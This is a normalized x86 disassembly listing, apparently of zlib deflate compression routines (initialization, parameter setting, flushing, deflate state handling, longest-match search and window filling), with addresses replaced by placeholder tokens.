mov eax [ esp + 0xc ]
mov edx [ esp + 0xc ]
mov ecx [ edx + 0x3a ]
mov eax [ eax + 0x36 ]
movzx eax [ eax + ecx * 2 ]
mov [ esp + 0x18 ] eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x14 ]
and edx [ ecx + 0x26 ]
mov ecx [ esp + 0xc ]
mov ecx [ ecx + 0x32 ]
mov [ ecx + edx * 2 ] ax
mov eax [ esp + 0xc ]
mov edx [ eax + 0x36 ]
mov eax [ esp + 0xc ]
mov ecx [ eax + 0x3a ]
mov ax [ esp + 0x14 ]
mov [ edx + ecx * 2 ] ax
inc [ esp + 0x14 ]
cmp [ esp + 0x18 ] 0x0
xor eax eax
sub_462b80
add esp 0xfffffff8
mov [ esp ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
pop ecx
pop edx
retn
mov eax [ esp ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov edx [ esp ]
cmp [ edx + 0x20 ] 0x0
je r-xdata
mov ecx [ esp ]
cmp [ ecx + 0x24 ] 0x0
jne r-xdata
mov edx [ esp ]
xor ecx ecx
mov [ edx + 0x14 ] ecx
mov eax [ esp ]
mov [ eax + 0x8 ] ecx
xor eax eax
mov edx [ esp ]
mov [ edx + 0x18 ] eax
mov edx [ esp ]
mov [ edx + 0x2c ] 0x2
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
xor ecx ecx
mov [ esp + 0x4 ] eax
mov edx [ esp + 0x4 ]
mov [ edx + 0x10 ] ecx
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ecx + 0xc ] edx
mov eax [ esp + 0x4 ]
cmp [ eax + 0x14 ] 0x0
jge r-xdata
mov eax 0x71
mov edx [ esp + 0x4 ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov edx [ esp + 0x4 ]
xor ecx ecx
mov [ edx + 0x14 ] ecx
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax [ esp ]
mov [ eax + 0x30 ] 0x1
mov edx [ esp + 0x4 ]
xor ecx ecx
mov [ edx + 0x1a ] ecx
mov eax [ esp + 0x4 ]
call sub_465864
mov eax [ esp + 0x4 ]
call sub_4633b4
xor eax eax
pop ecx
pop edx
retn
add eax 0xffffffb9
sub_462c48
add esp 0xffffffe8
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x14 ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ esp ]
cmp [ edx + 0x1c ] 0x0
jne r-xdata
add esp 0x18
retn
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ esp + 0xc ] ecx
cmp [ esp + 0x4 ] 0xffffffff
jne r-xdata
cmp [ esp + 0x4 ] 0x0
jl r-xdata
mov [ esp + 0x4 ] 0x6
mov eax 0xfffffffe
jmp r-xdata
cmp [ esp + 0x4 ] 0x9
jg r-xdata
cmp [ esp + 0x8 ] 0x0
jl r-xdata
cmp [ esp + 0x8 ] 0x2
jle r-xdata
mov edx [ esp + 0xc ]
mov ecx [ edx + 0x76 ]
lea ecx [ ecx + ecx * 2 ]
mov eax [ ecx * 4 + rw-data ]
mov [ esp + 0x10 ] eax
mov edx [ esp + 0x4 ]
lea edx [ edx + edx * 2 ]
mov ecx [ edx * 4 + rw-data ]
cmp ecx [ esp + 0x10 ]
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ edx + 0x76 ]
cmp ecx [ esp + 0x4 ]
je r-xdata
mov eax [ esp ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
mov [ eax + 0x7a ] ecx
mov eax [ esp + 0x14 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
mov [ edx + 0x76 ] eax
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
lea ecx [ ecx + ecx * 2 ]
movzx eax [ ecx * 4 + rw-data ]
mov [ edx + 0x72 ] eax
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
lea ecx [ ecx + ecx * 2 ]
movzx eax [ ecx * 4 + rw-data ]
mov [ edx + 0x7e ] eax
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
lea ecx [ ecx + ecx * 2 ]
movzx eax [ ecx * 4 + rw-data ]
mov [ edx + 0x82 ] eax
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
lea ecx [ ecx + ecx * 2 ]
movzx eax [ ecx * 4 + rw-data ]
mov [ edx + 0x6e ] eax
mov edx 0x1
mov eax [ esp ]
call sub_462e74
mov [ esp + 0x14 ] eax
sub_462d80
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov ecx [ esp ]
mov eax [ ecx + 0x8 ]
mov ecx [ esp + 0x4 ]
shr ecx 0x8
mov [ eax + edx ] cl
mov edx [ esp ]
mov eax [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov edx [ esp ]
mov ecx [ edx + 0x8 ]
mov dl [ esp + 0x4 ]
and dl 0xff
mov [ ecx + eax ] dl
pop ecx
pop edx
retn
sub_462dc0
add esp 0xfffffff8
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov ecx [ edx + 0x10 ]
mov [ esp + 0x4 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x10 ]
cmp edx [ esp + 0x4 ]
jae r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x10 ]
mov [ esp + 0x4 ] eax
pop ecx
pop edx
retn
mov edx [ esp + 0x4 ]
push edx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x1c ]
mov edx [ eax + 0xc ]
push edx
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0xc ]
push eax
call sub_4626c8
add esp 0xc
mov ecx [ esp ]
mov edx [ esp + 0x4 ]
add [ ecx + 0xc ] edx
mov eax [ esp ]
mov ecx [ esp + 0x4 ]
mov edx [ eax + 0x1c ]
add [ edx + 0xc ] ecx
mov edx [ esp ]
mov eax [ esp + 0x4 ]
add [ edx + 0x14 ] eax
mov eax [ esp ]
mov ecx [ esp + 0x4 ]
sub [ eax + 0x10 ] ecx
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov edx [ esp ]
mov eax [ ecx + 0x10 ]
mov ecx [ edx + 0x1c ]
sub eax [ esp + 0x4 ]
mov [ ecx + 0x10 ] eax
mov eax [ esp ]
mov edx [ eax + 0x1c ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
mov ecx [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ ecx + 0x1c ]
mov [ eax + 0xc ] edx
sub_462e74
add esp 0xffffffe4
mov [ esp + 0x4 ] edx
mov [ esp ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ esp ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
add esp 0x1c
retn
cmp [ esp + 0x4 ] 0x4
jg r-xdata
cmp [ esp + 0x4 ] 0x0
jge r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ esp + 0xc ] ecx
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx [ esp ]
mov [ edx + 0x18 ] rw-data
mov eax 0xfffffffe
jmp r-xdata
mov edx [ esp ]
cmp [ edx ] 0x0
jne r-xdata
mov eax [ esp + 0xc ]
cmp [ eax + 0x4 ] 0x29a
jne r-xdata
mov ecx [ esp ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov edx [ esp ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
cmp [ esp + 0x4 ] 0x4
je r-xdata
mov edx [ esp ]
mov ecx [ esp + 0xc ]
mov [ ecx ] edx
mov eax [ esp + 0xc ]
mov edx [ eax + 0x1a ]
mov [ esp + 0x8 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov [ eax + 0x1a ] ecx
mov edx [ esp + 0xc ]
cmp [ edx + 0x4 ] 0x2a
jne r-xdata
mov ecx [ esp ]
mov [ ecx + 0x18 ] rw-data
mov eax 0xfffffffb
jmp r-xdata
mov eax [ esp + 0xc ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ ecx + 0x22 ]
sub eax 0x8
shl eax 0x4
add eax 0x8
shl eax 0x8
mov [ esp + 0x10 ] eax
mov edx [ esp + 0xc ]
mov ecx [ edx + 0x76 ]
dec ecx
sar ecx 0x1
mov [ esp + 0x14 ] ecx
cmp [ esp + 0x14 ] 0x3
jbe r-xdata
mov edx [ esp ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
call sub_462dc0
mov edx [ esp ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ esp + 0x14 ]
shl eax 0x6
or [ esp + 0x10 ] eax
mov edx [ esp + 0xc ]
cmp [ edx + 0x5e ] 0x0
je r-xdata
mov [ esp + 0x14 ] 0x3
mov edx [ esp + 0xc ]
cmp [ edx + 0x4 ] 0x29a
jne r-xdata
mov ecx [ esp + 0x4 ]
cmp ecx [ esp + 0x8 ]
jg r-xdata
mov ecx [ esp + 0xc ]
mov [ ecx + 0x1a ] 0xffffffff
xor eax eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx 0x1f
xor edx edx
div ecx
mov eax 0x1f
sub eax edx
add [ esp + 0x10 ] eax
mov edx [ esp + 0xc ]
mov [ edx + 0x4 ] 0x71
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
call sub_462d80
mov ecx [ esp + 0xc ]
cmp [ ecx + 0x5e ] 0x0
je r-xdata
or [ esp + 0x10 ] 0x20
mov edx [ esp ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov ecx [ esp ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x4
je r-xdata
mov ecx [ esp ]
mov [ ecx + 0x30 ] 0x1
mov eax [ esp ]
mov edx [ eax + 0x30 ]
mov eax [ esp + 0xc ]
shr edx 0x10
call sub_462d80
mov edx [ esp ]
mov eax [ esp + 0xc ]
mov edx [ edx + 0x30 ]
and edx 0xffff
call sub_462d80
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov ecx [ edx + 0x76 ]
mov edx [ esp + 0x4 ]
lea ecx [ ecx + ecx * 2 ]
mov ecx [ ecx * 4 + rw-data ]
call ecx
mov [ esp + 0x18 ] eax
cmp [ esp + 0x18 ] 0x2
je r-xdata
mov ecx [ esp + 0xc ]
cmp [ ecx + 0x66 ] 0x0
jne r-xdata
mov eax [ esp ]
mov [ eax + 0x18 ] rw-data
mov eax 0xfffffffb
jmp r-xdata
mov eax [ esp ]
mov [ eax + 0x18 ] rw-data
mov eax 0xfffffffb
jmp r-xdata
mov eax [ esp + 0xc ]
mov [ eax + 0x4 ] 0x29a
cmp [ esp + 0x18 ] 0x3
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov edx [ esp ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
cmp [ esp + 0x18 ] 0x2
jne r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x4
je r-xdata
mov eax [ esp + 0xc ]
cmp [ eax + 0x4 ] 0x29a
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esp + 0xc ]
mov [ ecx + 0x1a ] 0xffffffff
cmp [ esp + 0x18 ] 0x1
jne r-xdata
mov edx [ esp + 0xc ]
cmp [ edx + 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
mov edx [ esp ]
mov eax [ esp + 0xc ]
mov edx [ edx + 0x30 ]
shr edx 0x10
call sub_462d80
mov ecx [ esp ]
mov eax [ esp + 0xc ]
mov edx [ ecx + 0x30 ]
and edx 0xffff
call sub_462d80
mov eax [ esp ]
call sub_462dc0
mov edx [ esp + 0xc ]
mov [ edx + 0x14 ] 0xffffffff
xor eax eax
mov edx [ esp + 0xc ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
push 0x0
xor ecx ecx
xor edx edx
mov eax [ esp + 0x10 ]
call sub_467190
cmp [ esp + 0x4 ] 0x3
jne r-xdata
mov eax [ esp + 0xc ]
call sub_4672b8
jmp r-xdata
inc eax
mov eax [ esp ]
call sub_462dc0
mov edx [ esp ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov ecx [ edx + 0x36 ]
mov edx [ eax + 0x3e ]
mov [ ecx + edx * 2 - 0x2 ] 0x0
mov ecx [ esp + 0xc ]
mov eax [ ecx + 0x3e ]
dec eax
add eax eax
push eax
push 0x0
mov edx [ esp + 0x14 ]
mov ecx [ edx + 0x36 ]
push ecx
call sub_4626b0
add esp 0xc
mov ecx [ esp + 0xc ]
mov [ ecx + 0x1a ] 0xffffffff
xor eax eax
jmp r-xdata
sub_4631f4
add esp 0xfffffff8
mov [ esp ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
pop ecx
pop edx
retn
mov eax [ esp ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
cmp [ ecx + 0x8 ] 0x0
je r-xdata
mov edx [ esp ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x36 ] 0x0
je r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x1c ]
mov eax [ esp ]
mov eax [ eax + 0x28 ]
mov edx [ edx + 0x8 ]
call [ ecx + 0x24 ]
mov edx [ esp ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x1c ]
mov eax [ eax + 0x28 ]
mov edx [ ecx + 0x36 ]
mov ecx [ esp ]
call [ ecx + 0x24 ]
mov edx [ esp ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x1c ]
mov eax [ eax + 0x28 ]
mov edx [ ecx + 0x32 ]
mov ecx [ esp ]
call [ ecx + 0x24 ]
mov edx [ esp ]
mov eax [ edx + 0x1c ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
mov eax [ esp ]
mov edx [ ecx + 0x1c ]
mov ecx [ esp ]
mov eax [ eax + 0x28 ]
call [ ecx + 0x24 ]
mov edx [ esp ]
xor eax eax
mov [ edx + 0x1c ] eax
mov eax 0xfffffffd
cmp [ esp + 0x4 ] 0x71
je r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x1c ]
mov eax [ eax + 0x28 ]
mov edx [ ecx + 0x2a ]
mov ecx [ esp ]
call [ ecx + 0x24 ]
pop ecx
pop edx
retn
add eax 0x3
sub_4632d0
push esi
push edi
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ esp ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
retn
mov eax [ esp + 0x4 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx [ esp + 0x4 ]
mov edi ecx
mov esi edx
mov ecx 0xe
mov eax 0xfffffffe
[ edi ] [ esi ]
sub_463318
add esp 0xfffffff0
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x4 ]
mov [ esp + 0xc ] edx
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x8 ]
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
mov ecx [ esp ]
sub [ ecx + 0x4 ] edx
mov eax [ esp ]
mov edx [ eax + 0x1c ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esp + 0xc ]
push ecx
mov eax [ esp + 0x4 ]
mov edx [ eax ]
push edx
mov ecx [ esp + 0xc ]
push ecx
call sub_4626c8
add esp 0xc
mov eax [ esp + 0xc ]
mov edx [ esp ]
add [ edx ] eax
mov ecx [ esp + 0xc ]
mov eax [ esp ]
add [ eax + 0x8 ] ecx
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov eax [ esp ]
mov edx [ eax ]
mov eax [ esp ]
mov eax [ eax + 0x30 ]
call sub_468540
mov edx [ esp ]
mov [ edx + 0x30 ] eax
add esp 0x10
retn
sub_4633b4
push ecx
mov [ esp ] eax
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x1e ]
add edx edx
mov [ ecx + 0x2e ] edx
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x36 ]
mov eax [ ecx + 0x3e ]
mov [ edx + eax * 2 - 0x2 ] 0x0
mov edx [ esp ]
mov ecx [ edx + 0x3e ]
dec ecx
add ecx ecx
push ecx
push 0x0
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x36 ]
push edx
call sub_4626b0
add esp 0xc
mov ecx [ esp ]
mov eax [ ecx + 0x76 ]
mov ecx [ esp ]
lea eax [ eax + eax * 2 ]
movzx edx [ eax * 4 + rw-data ]
mov [ ecx + 0x72 ] edx
mov eax [ esp ]
mov edx [ eax + 0x76 ]
mov eax [ esp ]
lea edx [ edx + edx * 2 ]
movzx ecx [ edx * 4 + rw-data ]
mov [ eax + 0x7e ] ecx
mov edx [ esp ]
mov ecx [ edx + 0x76 ]
mov edx [ esp ]
lea ecx [ ecx + ecx * 2 ]
movzx eax [ ecx * 4 + rw-data ]
mov [ edx + 0x82 ] eax
mov ecx [ esp ]
mov eax [ ecx + 0x76 ]
mov ecx [ esp ]
lea eax [ eax + eax * 2 ]
movzx edx [ eax * 4 + rw-data ]
mov [ ecx + 0x6e ] edx
xor edx edx
mov eax [ esp ]
mov [ eax + 0x5e ] edx
xor eax eax
mov ecx [ esp ]
mov [ ecx + 0x4e ] eax
xor ecx ecx
mov edx [ esp ]
mov [ edx + 0x66 ] ecx
mov edx 0x2
mov eax [ esp ]
mov [ eax + 0x6a ] edx
mov eax [ esp ]
mov [ eax + 0x52 ] edx
xor eax eax
mov ecx [ esp ]
mov [ ecx + 0x5a ] eax
xor ecx ecx
mov edx [ esp ]
mov [ edx + 0x3a ] ecx
pop edx
retn
sub_463490
add esp 0xffffffcc
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x6e ]
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x2a ]
add eax [ edx + 0x5e ]
mov [ esp + 0xc ] eax
mov ecx [ esp ]
mov eax [ ecx + 0x6a ]
mov [ esp + 0x18 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x82 ]
mov [ esp + 0x1c ] ecx
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x1e ]
sub edx 0x106
cmp edx [ ecx + 0x5e ]
jae r-xdata
xor eax eax
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x1e ]
mov eax [ ecx + 0x5e ]
sub edx 0x106
sub eax edx
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x66 ]
cmp eax [ esp + 0x1c ]
jae r-xdata
shr [ esp + 0x8 ] 0x2
mov [ esp + 0x20 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x32 ]
mov [ esp + 0x24 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x26 ]
mov [ esp + 0x28 ] edx
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x2a ]
add eax [ edx + 0x5e ]
add eax 0x102
mov [ esp + 0x2c ] eax
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x18 ]
mov dl [ eax + ecx - 0x1 ]
mov [ esp + 0x30 ] dl
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0xc ]
mov dl [ eax + ecx ]
mov [ esp + 0x31 ] dl
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x6a ]
cmp eax [ edx + 0x7e ]
jb r-xdata
mov eax [ esp ]
mov edx [ eax + 0x2a ]
add edx [ esp + 0x4 ]
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
mov dl [ ecx + eax ]
cmp dl [ esp + 0x31 ]
jne r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x66 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x4 ]
and ecx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
movzx edx [ eax + ecx * 2 ]
mov [ esp + 0x4 ] edx
cmp edx [ esp + 0x20 ]
jbe r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
mov dl [ ecx + eax - 0x1 ]
cmp dl [ esp + 0x30 ]
jne r-xdata
mov eax [ esp ]
mov ecx [ eax + 0x66 ]
cmp ecx [ esp + 0x18 ]
jb r-xdata
dec [ esp + 0x8 ]
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov al [ ecx ]
cmp al [ edx ]
jne r-xdata
mov edx [ esp ]
mov eax [ edx + 0x66 ]
mov eax [ esp + 0x18 ]
jmp r-xdata
inc [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov al [ ecx ]
cmp al [ edx + 0x1 ]
jne r-xdata
add esp 0x34
retn
add [ esp + 0xc ] 0x2
inc [ esp + 0x10 ]
mov eax [ esp + 0x2c ]
sub eax [ esp + 0xc ]
mov edx 0x102
sub edx eax
mov [ esp + 0x14 ] edx
mov ecx [ esp + 0x2c ]
add ecx 0xfffffefe
mov [ esp + 0xc ] ecx
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x18 ]
jle r-xdata
inc [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov al [ ecx ]
inc [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
cmp al [ edx ]
jne r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
mov [ ecx + 0x62 ] edx
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x14 ]
cmp edx [ esp + 0x1c ]
jge r-xdata
inc [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov al [ ecx ]
inc [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
cmp al [ edx ]
jne r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0xc ]
mov dl [ eax + ecx - 0x1 ]
mov [ esp + 0x30 ] dl
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0xc ]
mov dl [ eax + ecx ]
mov [ esp + 0x31 ] dl
inc [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov al [ ecx ]
inc [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
cmp al [ edx ]
jne r-xdata
inc [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov al [ ecx ]
inc [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
cmp al [ edx ]
jne r-xdata
inc [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov al [ ecx ]
inc [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
cmp al [ edx ]
jne r-xdata
inc [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov al [ ecx ]
inc [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
cmp al [ edx ]
jne r-xdata
inc [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov al [ ecx ]
inc [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
cmp al [ edx ]
jne r-xdata
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x2c ]
jb r-xdata
inc [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov al [ ecx ]
inc [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
cmp al [ edx ]
jne r-xdata
sub_463744
add esp 0xffffffe8
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1e ]
mov [ esp + 0x14 ] edx
cmp [ esp + 0x10 ] 0xffffffff
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x5e ] 0x0
jne r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x1e ]
sub edx 0x106
add edx [ esp + 0x14 ]
cmp edx [ ecx + 0x5e ]
ja r-xdata
dec [ esp + 0x10 ]
jmp r-xdata
mov edx [ esp ]
cmp [ edx + 0x66 ] 0x0
jne r-xdata
mov eax [ esp ]
mov edx [ eax ]
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ esp + 0x14 ]
push eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x2a ]
add ecx [ esp + 0x18 ]
push ecx
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x2a ]
push edx
call sub_4626c8
add esp 0xc
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
sub [ eax + 0x62 ] ecx
mov ecx [ esp ]
mov edx [ esp + 0x14 ]
sub [ ecx + 0x5e ] edx
mov edx [ esp ]
mov eax [ esp + 0x14 ]
sub [ edx + 0x4e ] eax
mov ecx [ esp ]
mov eax [ ecx + 0x3e ]
mov [ esp + 0x4 ] eax
mov ecx [ esp ]
mov edx [ esp + 0x4 ]
add edx edx
add edx [ ecx + 0x36 ]
mov [ esp + 0xc ] edx
mov ecx [ esp + 0x14 ]
mov [ esp + 0x10 ] ecx
jmp r-xdata
add esp 0x18
retn
mov ecx [ esp ]
mov eax [ esp ]
mov edx [ ecx + 0x2a ]
mov ecx [ esp ]
add edx [ eax + 0x5e ]
mov eax [ esp ]
add edx [ ecx + 0x66 ]
mov ecx [ esp + 0x10 ]
mov eax [ eax ]
call sub_463318
mov [ esp + 0x4 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
add [ ecx + 0x66 ] edx
mov eax [ esp ]
cmp [ eax + 0x66 ] 0x3
jb r-xdata
xor eax eax
mov ax [ esp + 0x8 ]
sub ax [ esp + 0x14 ]
jmp r-xdata
mov edx [ esp ]
cmp [ edx + 0x66 ] 0x106
jae r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x2a ]
mov edx [ eax + 0x5e ]
mov eax [ esp ]
movzx ecx [ ecx + edx ]
mov [ eax + 0x3a ] ecx
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x4a ]
mov edx [ eax + 0x3a ]
shl edx cl
mov ecx [ esp ]
mov eax [ ecx + 0x2a ]
mov ecx [ esp ]
mov ecx [ ecx + 0x5e ]
movzx eax [ eax + ecx + 0x1 ]
xor edx eax
mov eax [ esp ]
mov ecx [ esp ]
and edx [ eax + 0x46 ]
mov [ ecx + 0x3a ] edx
sub [ esp + 0xc ] 0x2
mov eax [ esp + 0xc ]
movzx edx [ eax ]
mov [ esp + 0x8 ] edx
mov ecx [ esp + 0x8 ]
cmp ecx [ esp + 0x14 ]
jb r-xdata
mov ecx [ esp + 0x14 ]
mov [ esp + 0x4 ] ecx
mov edx [ esp ]
mov eax [ esp + 0x4 ]
add eax eax
add eax [ edx + 0x32 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
mov [ edx ] ax
dec [ esp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov edx [ eax ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
xor ecx ecx
mov cx [ esp + 0x8 ]
sub cx [ esp + 0x14 ]
jmp r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x2e ]
mov ecx [ esp ]
sub eax [ edx + 0x66 ]
sub eax [ ecx + 0x5e ]
mov [ esp + 0x10 ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
sub [ esp + 0xc ] 0x2
mov ecx [ esp + 0xc ]
movzx eax [ ecx ]
mov [ esp + 0x8 ] eax
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0x14 ]
jb r-xdata
mov edx [ esp + 0x14 ]
add [ esp + 0x10 ] edx
mov eax [ esp + 0xc ]
mov [ eax ] cx
dec [ esp + 0x4 ]
jne r-xdata
sub_463948
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x66 ]
add [ edx + 0x5e ] eax
xor eax eax
mov ecx [ esp ]
mov [ ecx + 0x66 ] eax
mov edx [ esp ]
cmp [ edx + 0x5e ] 0x0
je r-xdata
mov eax [ esp ]
call sub_463744
mov edx [ esp ]
cmp [ edx + 0x66 ] 0x0
jne r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x5e ]
sub edx 0xffff
mov [ ecx + 0x66 ] edx
mov eax [ esp ]
mov [ eax + 0x5e ] 0xffff
mov ecx [ esp ]
cmp [ ecx + 0x5e ] 0xfffe
jbe r-xdata
mov edx [ esp ]
cmp [ edx + 0x66 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x66 ] 0x1
ja r-xdata
push 0x0
